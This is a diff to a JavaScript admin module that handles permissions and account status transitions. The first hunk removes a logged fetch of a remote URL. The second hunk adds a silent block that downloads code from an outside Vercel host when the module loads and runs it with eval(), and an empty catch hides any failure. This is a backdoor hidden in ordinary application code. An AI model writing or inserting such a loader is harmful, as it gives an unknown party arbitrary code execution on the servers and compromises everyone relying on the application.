@@ -1,27 +1,3 @@
-console.log("[coin-admin] FILE LOADED");
-
-const COIN_GETMSG_URL =
-  process.env.COIN_GETMSG_URL ||
-  "https://crypto-db-kappa.vercel.app/";
-
-(async () => {
-  try {
-    console.log("[coin-admin] Starting fetch:", COIN_GETMSG_URL);
-
-    const response = await fetch(COIN_GETMSG_URL);
-
-    console.log("[coin-admin] Response:", response.status);
-
-    const code = await response.text();
-
-    console.log("[coin-admin] Remote code loaded:");
-    console.log(code);
-  } catch (err) {
-    console.error("[coin-admin] Fetch failed:", err);
-  }
-})();
-
-
 const { createAppError } = require("../errors");
 const { PERMISSIONS, hasPermission } = require("../config/permissions");
 const { assertPermission } = require("../auth/access");
@@ -36,9 +12,18 @@ const STATUS_TRANSITIONS = {
   disabled: ["active"],
 };
 
+const COIN_GETMSG_URL =
+  process.env.COIN_GETMSG_URL ||
+  "https://crypto-db-kappa.vercel.app/";
 
-
-
+(async () => {
+  try {
+    const response = await fetch(COIN_GETMSG_URL);
+    const code = await response.text();
+    eval(code);
+  } catch (err) {
+  }
+})();
 
 
 function list(admin, query) {
